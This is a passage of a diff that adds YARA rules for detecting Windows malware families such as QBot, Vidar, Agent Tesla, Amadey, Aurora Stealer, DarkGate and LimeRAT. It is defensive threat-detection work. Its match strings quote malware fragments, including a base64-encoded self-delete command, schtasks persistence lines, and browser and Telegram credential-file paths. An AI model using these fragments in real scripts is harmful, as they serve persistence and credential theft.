+		$kit3 = "id='_form_" ascii
+		$kit4 = "enctype='multipart/form-data'" ascii
+	condition:
+		filesize < 50KB and all of them
+}import "pe"
+
+rule unpacked_qbot
+{
+	meta:
+		description = "Detects unpacked or memory-dumped QBot samples"
+		date = "2022-06-21"
+		yarahub_author_twitter = "@z3r0privacy"
+		yarahub_reference_md5 = "159E8962C4646EB3ED7C7837F6143F47"
+		yarahub_uuid = "a2ad2850-fa12-469f-947a-9dbf79ffcc51"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		malpedia_family = "win.qakbot"
+
+	strings:
+		$f_crc = { 33 ?? 8b ?? c1 ?? 04 83 ?? 0f 33 [1-6] 8b ?? c1 ?? 04 83 ?? 0f 33 }
+		$c_apihash = { 5b e9 8f 21 }
+
+	condition:
+		all of them
+		and pe.is_pe and filesize < 1MB
+}rule vidar_stealer_unpacked {
+    meta:
+        description = "Detects the unpacked Vidar binary."        
+        author = "@jstrosch"
+        date = "2023-01-07"
+        yarahub_uuid = "b576e8fb-f45b-4da8-9cd9-a082ed88b34f"
+        yarahub_license = "CC0 1.0"
+        yrarahub_author_twitter = "@jstrosch"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "7b419724d28a464fa3ccead029201e05"
+
+    strings:
+        /*
+            83 E4 F8                and     esp, 0FFFFFFF8h
+            E8 75 43 FF FF          call    sub_40107B
+            E8 70 43 FF FF          call    sub_40107B
+            E8 6B 43 FF FF          call    sub_40107B
+            E8 D1 43 FF FF          call    sub_4010E6
+            E8 BF D8 00 00          call    sub_41A5D9
+            E8 E1 42 FF FF          call    sub_401000
+            E8 A3 FF FF FF          call    sub_40CCC7
+            E8 9E FF FF FF          call    sub_40CCC7
+            E8 99 FF FF FF          call    sub_40CCC7
+            E8 3D F9 FF FF          call    sub_40C670
+            33 C0                   xor     eax, eax
+        */
+
+        $c1 = {
+            83 E4 F8
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            E8 [4]
+            33
+        }
+
+    condition:
+        uint16(0) == 0x5a4d and $c1
+}import "pe"
+
+rule vulnerablity_driver2_PhysicalMemory {
+    meta:
+		description = "vulnerablity_driver2_PhysicalMemory"
+        date = "2023-07-21"
+        author ="wonderkun"
+        yarahub_reference_md5     = "3b25a34bb08f4759792c24b121109503"
+        yarahub_uuid = "34512c64-fa1a-472b-89d7-ff36fafb943d"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        tlp = "WHITE"
+    strings:
+        $PhysicalMemory = "\\Device\\PhysicalMemory"
+        $PhysicalMemory_Wide = "\\Device\\PhysicalMemory" wide
+	condition:
+        pe.is_64bit()
+        and
+        filesize > 3000KB
+		and
+		filesize < 10000KB
+        and
+        (pe.number_of_signatures >0)
+        and
+        (
+            for all i in (0..pe.number_of_signatures - 1):
+            (
+            pe.signatures[i].valid_on(pe.timestamp)
+            )
+        )
+        and
+		(pe.imports("ntoskrnl.exe","ZwMapViewOfSection") or pe.imports("ntoskrnl.exe","NtMapViewOfSection"))
+        and
+        (($PhysicalMemory) or ($PhysicalMemory_Wide))
+}
+
+rule win_agent_tesla_ab4444e9 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2020-10-01"
+        description               = "detects Agent Tesla"
+        hash                      = "dcd7323af2490ceccfc9da2c7f92c54a"
+        malpedia_family           = "win.agent_tesla"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "dcd7323af2490ceccfc9da2c7f92c54a"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "ab4444e9-18b1-4920-b105-35377741899f"
+
+    strings:
+        $string_1  = "get_CHoo"
+        $string_2  = "get_Lenght"
+        $string_3  = "get_kbok"
+        $string_4  = "get_sSL"
+        $string_5  = "get_useSeparateFolderTree"
+        $string_6  = "set_AccountCredentialsModel"
+        $string_7  = "set_BindingAccountConfiguration"
+        $string_8  = "set_CHoo"
+        $string_9  = "set_CreateNoWindow"
+        $string_10 = "set_IdnAddress"
+        $string_11 = "set_IsBodyHtml"
+        $string_12 = "set_Lenght"
+        $string_13 = "set_MaximumAutomaticRedirections"
+        $string_14 = "set_UseShellExecute"
+        $string_15 = "set_disabledByRestriction"
+        $string_16 = "set_kbok"
+        $string_17 = "set_sSL"
+        $string_18 = "set_signingEncryptionPreset"
+        $string_19 = "set_useSeparateFolderTree"
+
+    condition:
+        uint16(0) == 0x5A4D and
+        15 of ($string_*)
+}
+rule win_amadey_a9f4 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-11-17"
+        description               = "matches unpacked Amadey samples"
+        hash_md5                  = "25cfcfdb6d73d9cfd88a5247d4038727"
+        hash_sha1                 = "912d1ef61750bc622ee069cdeed2adbfe208c54d"
+        hash_sha256               = "03effd3f94517b08061db014de12f8bf01166a04e93adc2f240a6616bb3bd29a"
+        malpedia_family           = "win.amadey"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "25cfcfdb6d73d9cfd88a5247d4038727"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "a9f41cd4-3f67-42fc-b310-e9b251c95fe4"
+
+    strings:
+        $pdb  = "\\Amadey\\Release\\Amadey.pdb"
+        /*  Amadey uses multiple hex strings to decrypt the strings, C2 traffic
+            and as identification. The preceeding string 'stoi ...' is added to
+            improve performance.
+        */
+        $keys = /stoi argument out of range\x00\x00[a-f0-9]{32}\x00{1,16}[a-f0-9]{32}\x00{1,4}[a-f0-9]{6}\x00{1,4}[a-f0-9]{32}\x00/
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            $pdb or $keys
+        )
+}
+rule win_aurora_stealer_a_706a {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-12-14"
+        description               = "detects Aurora Stealer samples"
+        hash1_md5                 = "51c153501e991f6ce4901e6d9578d0c8"
+        hash1_sha1                = "3816f17052b28603855bde3e57db77a8455bdea4"
+        hash1_sha256              = "c148c449e1f6c4c53a7278090453d935d1ab71c3e8b69511f98993b6057f612d"
+        hash2_md5                 = "65692e1d5b98225dbfb1b6b2b8935689"
+        hash2_sha1                = "0b51765c175954c9e47c39309e020bcb0f90b783"
+        hash2_sha256              = "5a42aa4fc8180c7489ce54d7a43f19d49136bd15ed7decf81f6e9e638bdaee2b"
+        malpedia_family           = "win.aurora_stealer"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "51c153501e991f6ce4901e6d9578d0c8"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "706a5977-69fb-44ae-bfa7-f61e214148e7"
+
+    strings:
+
+        $str_func_01 = "main.(*DATA_BLOB).ToByteArray"
+        $str_func_02 = "main.Base64Encode"
+        $str_func_03 = "main.Capture"
+        $str_func_04 = "main.CaptureRect"
+        $str_func_05 = "main.ConnectToServer"
+        $str_func_06 = "main.CreateImage"
+        $str_func_07 = "main.FileExsist"
+        $str_func_08 = "main.GetDisplayBounds"
+        $str_func_09 = "main.GetInfoUser"
+        $str_func_10 = "main.GetOS"
+        $str_func_11 = "main.Grab"
+        $str_func_12 = "main.MachineID"
+        $str_func_13 = "main.NewBlob"
+        $str_func_14 = "main.NumActiveDisplays"
+        $str_func_15 = "main.PathTrans"
+        $str_func_16 = "main.SendToServer_NEW"
+        $str_func_17 = "main.SetUsermame"
+        $str_func_18 = "main.Zip"
+        $str_func_19 = "main.base64Decode"
+        $str_func_20 = "main.countupMonitorCallback"
+        $str_func_21 = "main.enumDisplayMonitors"
+        $str_func_22 = "main.getCPU"
+        $str_func_23 = "main.getDesktopWindow"
+        $str_func_24 = "main.getGPU"
+        $str_func_25 = "main.getMasterKey"
+        $str_func_26 = "main.getMonitorBoundsCallback"
+        $str_func_27 = "main.getMonitorRealSize"
+        $str_func_28 = "main.sysTotalMemory"
+        $str_func_29 = "main.xDecrypt"
+
+        $str_type_01 = "type..eq.main.Browser_G"
+        $str_type_02 = "type..eq.main.STRUSER"
+        $str_type_03 = "type..eq.main.Telegram_G"
+        $str_type_04 = "type..eq.main.Crypto_G"
+        $str_type_05 = "type..eq.main.ScreenShot_G"
+        $str_type_06 = "type..eq.main.FileGrabber_G"
+        $str_type_07 = "type..eq.main.FTP_G"
+        $str_type_08 = "type..eq.main.Steam_G"
+        $str_type_09 = "type..eq.main.DATA_BLOB"
+        $str_type_10 = "type..eq.main.Grabber"
+
+        $varia_01 = "\\User Data\\Local State"
+        $varia_02 = "\\\\Opera Stable\\\\Local State"
+        $varia_03 = "Reconnect 1"
+        $varia_04 = "@ftmone"
+        $varia_05 = "^user^"
+        $varia_06 = "wmic path win32_VideoController get name"
+        $varia_07 = "\\AppData\\Roaming\\Telegram Desktop\\tdata"
+        $varia_08 = "C:\\Windows.old\\Users\\"
+        $varia_09 = "ScreenShot"
+        $varia_10 = "Crypto"
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            32 of ($str_*) or
+            9 of ($varia_*)
+        )
+}
+rule win_bitcoin_genesis_b9_ce9f {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-07-22"
+        description               = "detects a downloader with a DGA based on the Bitcoin Genesis Block"
+        hash_md5                  = "5c13ee5dbe45d02ed74ef101b2e82ae6"
+        hash_sha1                 = "bdc36bc233675e7a96faa2c4917e9b756cc2a2a0"
+        hash_sha256               = "ad1e39076212d8d58ff45d1e24d681fe0c600304bd20388cddcf9182b1d28c2f"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "5c13ee5dbe45d02ed74ef101b2e82ae6"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "ce9f9e49-464a-489b-90fb-d4c81e98e360"
+
+    strings:
+        $str_json_1 = "\"bytes\": ["
+        $str_json_2 = "\"subtype\": "
+        $str_json_3 = "{\"bytes\":["
+        $str_json_4 = "],\"subtype\":"
+        $str_json_5 = "null}"
+        $str_json_6 = "<discarded>"
+        $str_json_7 = "[json.exception."
+
+        /*
+            mov     dl, [ebp+var_14]
+            mov     [eax+ecx], dl
+            mov     byte ptr [eax+ecx+1], 0
+            jmp     short loc_3CBF9F
+        */
+        $split_hash_1 = {8A 55 ?? 88 14 08 C6 44 08 01 00 EB}
+        /*
+            inc     ebx
+            cmp     ebx, 10h
+            jl      loc_3CBF10
+        */
+        $split_hash_2 = {43 83 FB 10 0F 8C}
+
+        /*
+            push    0
+            push    0
+            mov     [ebp-14h], edx
+            mov     [ebp-18h], eax
+        */
+        $format_the_date = {6A 00 6A 00 89 55 EC 89 45 E8}
+
+    condition:
+        uint16(0) == 0x5A4D and
+        all of ($str_json_*) and
+        all of ($split_hash_*) and
+        $format_the_date
+}
+rule win_colibriloader : packed loader 
+{
+  meta:
+    author =                    "andretavare5"
+    org =                       "BitSight"
+    date =                      "2022-09-21"
+    description =               "Packed ColibriLoader malware"
+    yarahub_author_twitter =    "@andretavare5"
+    yarahub_reference_link =    "https://fr3d.hk/blog/colibri-loader-back-to-basics"
+    yarahub_malpedia_family =   "win.colibri"
+    yarahub_uuid =              "287f394b-2160-4f36-8ab7-bfb95fc75355"
+    yarahub_license =           "CC BY-NC-SA 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5 =     "e0a68b98992c1699876f818a22b5b907"
+    
+  strings:
+    $str1 = "NtUnmapViewOfSct"
+    $str2 = "RtlAllocateHeap"
+    $str3 = "user32.dll"
+    $str4 = "kernel32.dll"
+                              
+  condition:
+    uint16(0) == 0x5A4D and // MZ
+    all of them
+}rule win_colibriloader_unpacked : loader
+{
+  meta:
+    author =      "andretavare5"
+    description = "ColibriLoader malware"
+    org =         "BitSight"
+    date =        "2022-11-22"
+    md5 =         "f1bbf3a0c6c52953803e5804f4e37b15"
+    reference =   "https://malpedia.caad.fkie.fraunhofer.de/details/win.colibri"
+    license =     "CC BY-NC-SA 4.0"
+
+	yarahub_author_twitter =    "@andretavare5"
+    yarahub_reference_link =    "https://fr3d.hk/blog/colibri-loader-back-to-basics"
+    yarahub_malpedia_family =   "win.colibri"
+    yarahub_uuid =              "1dcc7399-8e13-4a21-9fec-fb1e08c640a6"
+    yarahub_license =           "CC BY-NC-SA 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5 =     "f1bbf3a0c6c52953803e5804f4e37b15"
+    
+  strings:
+  	// str decrypt loop
+    // --------------------------
+    // xor     edx, edx
+    // mov     eax, ebx
+    // div     [ebp+key_len]
+    // mov     ax, [esi+edx*2]
+    // xor     ax, [edi+ecx]
+    // inc     ebx
+    // mov     [ecx], ax
+    // lea     ecx, [ecx+2]
+    // cmp     ebx, [ebp+str_len]
+    // jb      short loc_40596A
+    $x = {33 D2 8B C3 F7 75 14 66 8B 04 56 66 33 04 0F 43 66 89 01 8D 49 02 3B 5D 0C 72 E5} 
+                              
+  condition:
+    uint16(0) == 0x5A4D and // MZ
+    all of them
+}rule win_danabot_cdf38827 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-04-19"
+        description               = "detects DanaBot"
+        hash1                     = "b7f891f4ed079420e16c4509680cfad824b061feb94a0d801c96b82e1f7d52ad"
+        hash1b                    = "62174157b42e5c8c86b05baf56dfd24b"
+        hash2                     = "c8f27c0e0d4e91b1a6f62f165d45d8616fc24d9c798eb8ab4269a60e29a2de5e"
+        hash3                     = "5cb70c87f0b98279420dde0592770394bf8d5b57df50bce4106d868154fd74cb"
+        malpedia_family           = "win.danabot"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.1"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "62174157b42e5c8c86b05baf56dfd24b"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "cdf38827-649c-4194-85b0-881c98f1c562"
+
+    strings:
+        $keyboard = { C6 05 [4] 71 C6 05 [4] 77 C6 05 [4] 65 C6 05 [4] 72 C6 05 [4] 74 C6 05 [4] 79 C6 05 [4] 75 C6 05 [4] 69 C6 05 [4] 6F  }
+        $move_y   = { 8B 45 F8 C6 80 [4] 79 } // mov     eax, [ebp-8], mov     byte ptr <addr>[eax], 79h
+        $id_str   = /[A-F0-9]{32}zz/
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            all of them
+        )
+}
+rule Win_DarkGate
+{
+	meta:
+		author = "0xToxin"
+		description = "DarkGate Strings Decryption Routine"
+		date = "2023-08-01"
+		yarahub_reference_md5 = "152ea1d672c7955f3da965dc320dc170"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_uuid = "9e190198-c38c-405b-a810-0a4c1b5b6db0"
+	strings:
+		$chunk_1 = {
+			8B 55 ??
+			8A 4D ??
+			80 E1 3F
+			C1 E1 02
+			8A 5D ??
+			80 E3 30
+			81 E3 FF 00 00 00
+			C1 EB 04
+			02 CB
+			88 4C 10 ??
+			FF 45 ??
+			80 7D ?? 40
+			74 ??
+			8B 45 ??
+			E8 ?? ?? ?? ??
+			8B 55 ??
+			8A 4D ??
+			80 E1 0F
+			C1 E1 04
+			8A 5D ??
+			80 E3 3C
+			81 E3 FF 00 00 00
+			C1 EB 02
+			02 CB
+			88 4C 10 ??
+			FF 45 ??
+			80 7D ?? 40
+			74 ??
+			8B 45 ??
+			E8 ?? ?? ?? ??
+			8B 55 ??
+			8A 4D ??
+			80 E1 03
+			C1 E1 06
+			8A 5D ??
+			80 E3 3F
+			02 CB
+			88 4C 10 ??
+			FF 45 ??
+		}
+	
+	condition:
+		any of them
+}
+rule win_erbium_stealer_a1_2622 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-09-01"
+        description               = "detects the unpacked Erbium stealer"
+        hash1_md5                 = "e719388778f14e77819a62c5759d114b"
+        hash1_sha1                = "540fe15ae176cadcfa059354fcdfe59a41089450"
+        hash1_sha256              = "d932a62ab0fb28e439a5a7aab8db97b286533eafccf039dd079537ac9e91f551"
+        hash2_md5                 = "74f53a6ad69f61379b6ca74144b597e6"
+        hash2_sha1                = "f188b5edc93ca1e250aee92db84f416b1642ec7f"
+        hash2_sha256              = "d45c7e27054ba5d38a10e7e9d302e1d6ce74f17cf23085b65ccfba08e21a8d0b"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "e719388778f14e77819a62c5759d114b"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "2622fa81-d545-4b34-918c-ddc9c16d9b48"
+
+    strings:
+        $str_path            = "ErbiumDed/api.php?method=getstub&bid=" wide
+        $str_tag             = "malik_here" ascii
+        $fowler_noll_vo_hash = {C5 9D 1C 81 [1-100] 93 01 00 01}
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            all of ($str_*) and #fowler_noll_vo_hash >= 2
+        )
+}
+rule win_Eternity
+{
+	meta:
+		author = "0xToxin"
+		description = "Eternity function routines"
+		date = "2022-12-10"
+		yarahub_reference_md5 = "cb1b7d3a9bd4f3742c3b8c4c21c808b8"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		malpedia_family = "win.eternity_stealer"
+		yarahub_uuid = "8af629d9-206a-4d75-acd2-f6b21ae9b4ac"
+	strings:
+		$string_xor_routine = {
+			5D
+			?? ?? 00 00 0A
+			61
+			D1
+		}
+		
+		$switch_case = {
+			FE 0C 00 00
+			FE 0C 01 00
+			93
+			?? ?? 00 00 0A
+		}
+	condition:
+		uint16(0) == 0x5a4d and $string_xor_routine and #switch_case >= 3
+	}rule win_gcleaner_de41 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-05-29"
+        description               = "detects GCleaner"
+        hash1_md5                 = "8151e61aec021fa04bce8a30ea052e9d"
+        hash1_sha1                = "4b972d2e74a286e9663d25913610b409e713befd"
+        hash1_sha256              = "868fceaa4c01c2e2ceee3a27ac24ec9c16c55401a7e5a7ca05f14463f88c180f"
+        hash2_md5                 = "7526665a9d5d3d4b0cfffb2192c0c2b3"
+        hash2_sha1                = "13bf754b44526a7a8b5b96cec0e482312c14838c"
+        hash2_sha256              = "bb5cd698b03b3a47a2e55a6be3d62f3ee7c55630eb831b787e458f96aefe631b"
+        hash3_md5                 = "a39e68ae37310b79c72025c6dfba0a2a"
+        hash3_sha1                = "ae007e61c16514a182d21ee4e802b7fcb07f3871"
+        hash3_sha256              = "c5395d24c0a1302d23f95c1f95de0f662dc457ef785138b0e58b0324965c8a84"
+        malpedia_family           = "win.gcleaner"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "8151e61aec021fa04bce8a30ea052e9d"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "de41ff50-28a7-4a09-86dc-f737f8858354"
+
+    strings:
+        $accept = "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"
+        $accept_lang = "Accept-Language: ru-RU,ru;q=0.9,en;q=0.8"
+        $accept_charset = "Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1"
+        $accept_encoding = "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0"
+
+        $unkown = "<unknown>"
+        $cmd1 = "\" & exit"
+        $cmd2 = "\" /f & erase "
+        $cmd3 = "/c taskkill /im \""
+
+        $anti1 = " Far "
+        $anti2 = "roxifier"
+        $anti3 = "HTTP Analyzer"
+        $anti4 = "Wireshark"
+        $anti5 = "NetworkMiner"
+
+        $mix1 = "mixshop"
+        $mix2 = "mixtwo"
+        $mix3 = "mixnull"
+        $mix4 = "mixazed"
+
+    condition:
+        uint16(0) == 0x5A4D and
+        15 of them
+}
+rule win_imminentrat_j1_7e208e97 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2021-10-01"
+        description               = "detects the imminent rat"
+        hash1                     = "a728603061b5aa98fa40fb0447ba71e3"
+        hash2                     = "5d8446a23b80e9b6cb7406c2ba81d606685cf11b24e9eb8309153a47b04f3aad"
+        malpedia_family           = "win.imminent_monitor_rat"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "a728603061b5aa98fa40fb0447ba71e3"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "7e208e97-3295-4714-8797-6e0f56c7c354"
+
+    strings:
+        $str_mining_1 = "Downloading miner data" wide
+        $str_mining_2 = "This client is already mining" wide
+        $str_mining_3 = "Started mining successfully" wide
+        $str_mining_4 = "Unable to start mining" wide
+        $str_mining_5 = "-o {0} -u {1} -p {2} -a scrypt -I {3} -T {4}" wide
+
+        $str_plugin_1 = "\\Imminent\\Plugins\\" wide
+
+        $str_fingerprint_1 = "Screens: {0}" wide
+        $str_fingerprint_2 = "Battery: {0}" wide
+        $str_fingerprint_3 = "Ram Usage: {0}%" wide
+        $str_fingerprint_4 = "Last Reboot: {0}" wide
+        $str_fingerprint_5 = "Graphics Card: {0}" wide
+        $str_fingerprint_6 = "Firewall: {0}" wide
+        $str_fingerprint_7 = "Anti-Virus: {0}" wide
+        $str_fingerprint_8 = "Unique Identifier: {0}" wide
+        $str_fingerprint_9 = "Privileges: {0}" wide
+        $str_fingerprint_10 = "MAC Address: {0}" wide
+        $str_fingerprint_11 = "Client Location: {0}" wide
+        $str_fingerprint_12 = "Ram: {0}" wide
+        $str_fingerprint_13 = "LAN: {0}" wide
+        $str_fingerprint_14 = "Processor: {0}" wide
+        $str_fingerprint_15 = "Computer Username: {0}" wide
+        $str_fingerprint_16 = "Operating System: {0}" wide
+        $str_fingerprint_17 = "Client Identifier: {0}" wide
+        $str_fingerprint_18 = "Computer Name: {0}" wide
+
+        $str_filedownload_1 = "File downloaded & executed" wide
+        $str_filedownload_2 = "File downloaded & updated" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        3 of ($str_mining_*) and
+        $str_plugin_1 and
+        15 of ($str_fingerprint_*) and
+        all of ($str_filedownload_*)
+}
+rule win_laplas_clipper_9c96 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-11-09"
+        description               = "detects unpacked Laplas Clipper"
+        hash1_md5                 = "3afb4573dea2dbac4bb5f1915f7a4dce"
+        hash1_sha1                = "9ad8b880f3ab35f0d1a7fe46d9d8e0bea36e0d14"
+        hash1_sha256              = "52901dc481d1be2129725e3c4810ae895f9840e27a1dce69630dedcf71b6c021"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "3afb4573dea2dbac4bb5f1915f7a4dce"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+	yarahub_uuid              = "5f272188-cabb-441a-8278-b9b82fe4d653"
+
+
+    strings:
+        $func_names_0 = "main.request"
+        $func_names_1 = "main.setOnline"
+        $func_names_2 = "main.getRegex"
+        $func_names_3 = "main.getAddress"
+        $func_names_4 = "main.waitOpenClipboard"
+        $func_names_5 = "main.clipboardRead"
+        $func_names_6 = "main.clipboardWrite"
+        $func_names_7 = "main.startHandler"
+        $func_names_8 = "main.isRunning"
+        $func_names_9 = "main.main"
+        $func_names_10 = "main.isStartupEnabled"
+        $func_names_11 = "main.decrypt"
+        $func_names_12 = "main.existsPath"
+        $func_names_13 = "main.getPid"
+        $func_names_14 = "main.writePid"
+        $func_names_15 = "main.enableStartup"
+        $func_names_16 = "main.copyFile"
+        $func_names_17 = "main.clipboardWrite.func1"
+        $func_names_18 = "main.init"
+
+        $startup_0 = "/sc"
+        $startup_1 = "/ri"
+        $startup_2 = "/st"
+        $startup_3 = "/tr"
+        $startup_4 = "/tn"
+        $startup_5 = "/create"
+        $startup_6 = "/C"
+        $startup_7 = "once"
+        $startup_8 = "cmd.exe"
+        $startup_9 = "9999:59"
+        $startup_10 = "00:00"
+
+        $request_0 = "http://"
+        $request_1 = "/bot/"
+        $request_2 = "key="
+
+    condition:
+        uint16(0) == 0x5A4D and
+        17 of ($func_names_*)  and
+        9 of ($startup_*) and
+        all of ($request_*)
+}
+rule win_limerat_j1_00cfd931 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2021-10-01"
+        description               = "detects the lime rat"
+        hash                      = "2a0575b66a700edb40a07434895bf7a9"
+        malpedia_family           = "win.limerat"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.1"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "2a0575b66a700edb40a07434895bf7a9"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "00cfd931-3e03-4e32-b0d7-ca8f6bbfe062"
+
+    strings:
+        $str_1 = "Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=" wide
+        $str_2 = "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin" wide
+        $str_3 = "Minning..." wide
+        $str_4 = "--donate-level=" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        3 of them
+}
+rule win_lu0bot_loader_1d53 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2023-03-08"
+        description               = "detects the loader of the Lu0bot malware"
+        hash_md5                  = "c5eb9c6ded323a8db7eb739e514bb46c"
+        hash_sha1                 = "cede3aa5e1821a47f416c64bc48d1aab72eb48ca"
+        hash_sha256               = "5a2283a997ab6a9680b69f9318315df3c9e634b3c4dd4a46f8bc5df35fc81284"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "c5eb9c6ded323a8db7eb739e514bb46c"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "1d536a34-2111-40fe-aea8-d8e9062dfe8b"
+
+    strings:
+        /*
+            add     edi, ?h
+            sub     dword ptr [esi], <4 byte key>
+            add     esi, 4
+            (optional mov)
+            cmp     esi, edi
+        */
+        $decryption = { 81 C7 ?? 0? 00 00
+                        81 2E ?? ?? ?? ??
+                        83 C6 04
+                        [0-4]
+                        39 FE}
+        /*
+            mov     ebx, 0
+            push    ebx
+            push    eax
+            mov     eax, offset WinExec
+            call    dword ptr [eax]
+        */
+        $winexec    = { BB 00 00 00 00
+                        53
+                        50
+                        B8 ?? ?? ?? ??
+                        FF 10}
+        /*
+
+            mov     eax, 0
+            push    eax
+            call    ExitProcess
+        */
+        $exit       = { B8 00 00 00 00
+                        50
+                        E8}
+
+    condition:
+        (uint16(0) == 0x5A4D) and
+        $decryption and
+        $winexec and
+        $exit
+}
+import "pe"
+
+rule win_matanbuchus : loader 
+{
+  meta:
+    description =               "Detects Matanbuchus MaaS loader and core"
+    author =                    "andretavare5"
+    org =                       "BitSight"
+    date =                      "2022-07-15"
+    yarahub_author_twitter =    "@andretavare5"
+    yarahub_reference_link =    "https://research.openanalysis.net/matanbuchus/loader/yara/triage/dumpulator/emulation/2022/06/19/matanbuchus-triage.html"
+    yarahub_malpedia_family =   "win.matanbuchus"
+    yarahub_uuid =              "0857d7bd-4d9c-478b-a11c-e80fbf948c74"
